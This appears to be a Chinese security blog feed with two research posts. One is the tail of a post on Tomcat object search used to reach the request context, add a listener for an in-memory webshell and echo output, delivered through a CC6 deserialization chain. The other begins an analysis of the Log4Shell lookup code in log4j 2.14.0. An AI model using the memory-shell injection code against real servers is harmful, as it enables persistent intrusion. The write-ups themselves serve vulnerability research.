&#125;</span><br></pre></td></tr></table></figure>

<p>这里看一下写的basic_search()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basic_search</span><span class="params">(location lcat)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> lcat.obj;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> lcat.path;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(lcat.clazz);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;);</span></span><br><span class="line">            <span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line"></span><br><span class="line">                Field fields[] = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                    fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">if</span> (fields[i].get(obj) == <span class="literal">null</span>)&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!Black.isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != <span class="literal">null</span> &amp;&amp; set.add(fields[i].get(obj))) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (judge_map.is_map(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">map_num</span> <span class="operator">=</span> <span class="number">0</span>; map_num &lt; map.size(); map_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">map_obj</span> <span class="operator">=</span> map.get(map_num);</span><br><span class="line">                                    <span class="keyword">if</span> (map_obj != <span class="literal">null</span> &amp;&amp; set.add(map_obj) &amp;&amp; !Black.isblack(map_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(map_obj, map_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + map_num + <span class="string">&quot;]&quot;</span>+map_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (judge_list.is_list(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (List) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (list.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">list_num</span> <span class="operator">=</span> <span class="number">0</span>; list_num &lt; list.size(); list_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">list_obj</span> <span class="operator">=</span> list.get(list_num);</span><br><span class="line">                                    <span class="keyword">if</span> (list_obj != <span class="literal">null</span> &amp;&amp; set.add(list_obj) &amp;&amp; !Black.isblack(list_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(list_obj, list_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + list_num + <span class="string">&quot;]&quot;</span>+list_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (fields[i].getType().isArray()) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//                            Object objarr1 = fields[i].get(obj);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Object[] arrobj = (Object[])fields[i].get(obj);</span><br><span class="line">                                <span class="keyword">if</span> (arrobj.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">obj_num</span> <span class="operator">=</span> <span class="number">0</span>; obj_num &lt; arrobj.length; obj_num++) &#123;</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">arr_obj</span> <span class="operator">=</span> arrobj[obj_num];</span><br><span class="line">                                        <span class="keyword">if</span> (arr_obj != <span class="literal">null</span> &amp;&amp; set.add(arr_obj) &amp;&amp; !Black.isblack(arr_obj.getClass().getName())) &#123;</span><br><span class="line">                                            <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(arr_obj, arr_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + obj_num + <span class="string">&quot;]&quot;</span>+arr_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                            System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;);</span></span><br><span class="line">                                            queue.offer(l);</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line"><span class="comment">//                                System.out.println(fields[i].get(obj));</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                            <span class="keyword">if</span> (target.is_target(fields[i],obj)) &#123;</span><br><span class="line"></span><br><span class="line">                                System.out.println(path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                            search.queue.offer(l);</span><br><span class="line"><span class="comment">//                        System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);</span></span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>全部完整代码上传至<a href="https://github.com/f19t/java-Object-simple-search/">https://github.com/f19t/java-Object-simple-search/</a></p>
<p>因为我们为了让回显和写内存马更方便，我们这里只搜了RequestFacade，我们简单写一个simple去搜索一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//simple</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            search.search();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>得到的输出是:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TaskThread---&gt;group(java.lang.ThreadGroup)--&gt;threads[<span class="number">14</span>]java.lang.Thread---&gt;</span><br><span class="line">target(org.apache.tomcat.util.net.NioEndpoint$Poller)---&gt;</span><br><span class="line"><span class="built_in">this</span>$<span class="number">0</span>(org.apache.tomcat.util.net.NioEndpoint)---&gt;</span><br><span class="line">handler(org.apache.coyote.AbstractProtocol$ConnectionHandler)---&gt;global(org.apache.coyote.RequestGroupInfo)--&gt;</span><br><span class="line">processors[<span class="number">0</span>]org.apache.coyote.RequestInfo---&gt;</span><br><span class="line">req(org.apache.coyote.Request)--&gt;</span><br><span class="line">notes[<span class="number">1</span>]org.apache.catalina.connector.Request---&gt;</span><br><span class="line">applicationRequest(org.apache.catalina.connector.RequestFacade)</span><br></pre></td></tr></table></figure>
<p>这里就表明我们已经成功搜索并拿到了当前线程的RequestFacade。有了RequestFacade我们就可以拿到StandardContext,下面操作在 <strong>if (target.is_target(fields[i],obj)) {}</strong> 里面执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RequestFacade</span> <span class="variable">reqfd</span> <span class="operator">=</span> (RequestFacade) fields[i].get(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> reqfd.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是protected</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) f.get(reqfd);<span class="comment">//反射获取值</span></span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"><span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;&#125;;</span><br><span class="line">context.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure>
<p>也可以拿到当前线程的response</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RequestFacade</span> <span class="variable">reqfd</span> <span class="operator">=</span> (RequestFacade) fields[i].get(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> reqfd.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是protected</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) f.get(reqfd);<span class="comment">//反射获取值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ff</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) ff.get(req);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;wwwwww&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780849147183.jpg"></p>
<p>我们可以很方便的把上面的代码组装成一个类，这样我们反序列化的时候可以使用加载字节码的方式执行我们的回显代码或者添加内存马。</p>
<p>完整代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/f19t/java-Object-simple-search/blob/main/search-object/src/main/java/com/f19t/searchobject/searchobject/search_utill.java</span><br></pre></td></tr></table></figure>

<h3 id="反序列化简单利用"><a href="#反序列化简单利用" class="headerlink" title="反序列化简单利用"></a>反序列化简单利用</h3><p>我们把要执行的代码放到构建的AbstractTranslet类里面。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">f</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.hang.web_test.location&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> f.getMethod(<span class="string">&quot;search&quot;</span>);</span><br><span class="line">method.invoke(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>生成序列化数据，这里用的cc6反序列化执行代码。<br><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780962023051.jpg"></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVASEC</tag>
      </tags>
  </entry>
  <entry>
    <title>log4jshell-2.14.0漏洞分析</title>
    <url>/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h2 id="log4jshell-2-14-0漏洞分析"><a href="#log4jshell-2-14-0漏洞分析" class="headerlink" title="log4jshell-2.14.0漏洞分析"></a>log4jshell-2.14.0漏洞分析</h2><p>这篇文章分析一下log4jshell的漏洞代码层面产生的原因。</p>
<span id="more"></span>

<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ul>
<li>java version “1.8.0_152”</li>
<li>idea 2023.3.3</li>
<li>log4j-core 2.14.0</li>
</ul>
<hr>
<p>手工创建环境过程：</p>
<ul>
<li><p>首先在pom.xml里面添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li><p>第二步在resources文件夹下添加log4j2.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appenders</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--        配置Appenders输出源为Console和输出语句SYSTEM_OUT--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> &gt;</span></span><br><span class="line">            <span class="comment">&lt;!--            配置Console的模式布局--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; [%t] %level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>第三步我们写一个简单的验证程序</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: f19t</span></span><br><span class="line"><span class="comment"> * Date: 2023/3/16 18:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Test.class);</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String a=<span class="string">&quot;$&#123;java:version&#125;&quot;</span>;</span><br><span class="line">        logger.error(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行这个Test将会得到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2023</span>-<span class="number">03</span>-<span class="number">17</span> <span class="number">15</span>:<span class="number">12</span>:<span class="number">04.362</span> [main] ERROR org.example.Test - Java version <span class="number">1.8</span><span class="number">.0_152</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞产生的位置在<font color=red>org.apache.logging.log4j.core.lookup.Interpolator.lookup()</font>方法。此方法存在一个strLookupMap，map内部的Key和value是我们利用的关键。里面有：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">Interpolator</span><span class="params">(<span class="keyword">final</span> Map&lt;String, String&gt; properties)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="built_in">this</span>.defaultLookup = <span class="keyword">new</span> <span class="title class_">MapLookup</span>((Map)(properties == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">HashMap</span>() : properties));</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;log4j&quot;</span>, <span class="keyword">new</span> <span class="title class_">Log4jLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;sys&quot;</span>, <span class="keyword">new</span> <span class="title class_">SystemPropertiesLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;env&quot;</span>, <span class="keyword">new</span> <span class="title class_">EnvironmentLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;marker&quot;</span>, <span class="keyword">new</span> <span class="title class_">MarkerLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;java&quot;</span>, <span class="keyword">new</span> <span class="title class_">JavaLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;lower&quot;</span>, <span class="keyword">new</span> <span class="title class_">LowerLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;upper&quot;</span>, <span class="keyword">new</span> <span class="title class_">UpperLookup</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;jndi&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception | LinkageError var9) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;jndi&quot;</span>, var9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;jvmrunargs&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception | LinkageError var8) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;jvmrunargs&quot;</span>, var8);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;date&quot;</span>, <span class="keyword">new</span> <span class="title class_">DateLookup</span>());</span><br><span class="line">        <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;ctx&quot;</span>, <span class="keyword">new</span> <span class="title class_">ContextMapLookup</span>());</span><br><span class="line">        <span class="keyword">if</span> (Constants.IS_WEB_APP) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;web&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">                <span class="built_in">this</span>.handleError(<span class="string">&quot;web&quot;</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            LOGGER.debug(<span class="string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;docker&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;docker&quot;</span>, var6);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;spring&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;spring&quot;</span>, var5);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.strLookupMap.put(<span class="string">&quot;kubernetes&quot;</span>, Loader.newCheckedInstanceOf(<span class="string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var3) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;kubernetes&quot;</span>, var3);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoClassDefFoundError var4) &#123;</span><br><span class="line">            <span class="built_in">this</span>.handleError(<span class="string">&quot;kubernetes&quot;</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们在lookup方法的漏洞触发的位置位置下断点，我们跟进分析一下。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790403862086.jpg"></p>
<p>运行Test，断点位置的堆栈如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lookup:<span class="number">223</span>, Interpolator (org.apache.logging.log4j.core.lookup)</span><br><span class="line">resolveVariable:<span class="number">1116</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">1038</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">substitute:<span class="number">912</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">replace:<span class="number">467</span>, StrSubstitutor (org.apache.logging.log4j.core.lookup)</span><br><span class="line">format:<span class="number">132</span>, MessagePatternConverter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">format:<span class="number">38</span>, PatternFormatter (org.apache.logging.log4j.core.pattern)</span><br><span class="line">toSerializable:<span class="number">345</span>, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout)</span><br><span class="line">toText:<span class="number">244</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">229</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">encode:<span class="number">59</span>, PatternLayout (org.apache.logging.log4j.core.layout)</span><br><span class="line">directEncodeEvent:<span class="number">197</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryAppend:<span class="number">190</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">append:<span class="number">181</span>, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender)</span><br><span class="line">tryCallAppender:<span class="number">156</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender0:<span class="number">129</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenderPreventRecursion:<span class="number">120</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppender:<span class="number">84</span>, AppenderControl (org.apache.logging.log4j.core.config)</span><br><span class="line">callAppenders:<span class="number">543</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">processLogEvent:<span class="number">502</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">485</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">460</span>, LoggerConfig (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">82</span>, AwaitCompletionReliabilityStrategy (org.apache.logging.log4j.core.config)</span><br><span class="line">log:<span class="number">161</span>, Logger (org.apache.logging.log4j.core)</span><br><span class="line">tryLogMessage:<span class="number">2198</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageTrackRecursion:<span class="number">2152</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessageSafely:<span class="number">2135</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logMessage:<span class="number">2011</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">logIfEnabled:<span class="number">1983</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">error:<span class="number">740</span>, AbstractLogger (org.apache.logging.log4j.spi)</span><br><span class="line">main:<span class="number">14</span>, Test (org.example)</span><br></pre></td></tr></table></figure>

<p>我们一步一步的分析，首先调用<font color=red>logger.error(a);</font>，error又会调用<font color=red>logIfEnabled</font><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790406217011.jpg"><br>logIfEnabled又调用<font color=red>isEnabled</font>判断日志是否支持记录<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790407461241.jpg"><br><font color=red>isEnabled</font>又调用filter，这里的filter其实就是我们之前写的log4j2.xml的配置文件。<br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790408494938.jpg"><br><img src="/2023/03/17/log4jshell-2-14-0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16790409053804.jpg"></p>
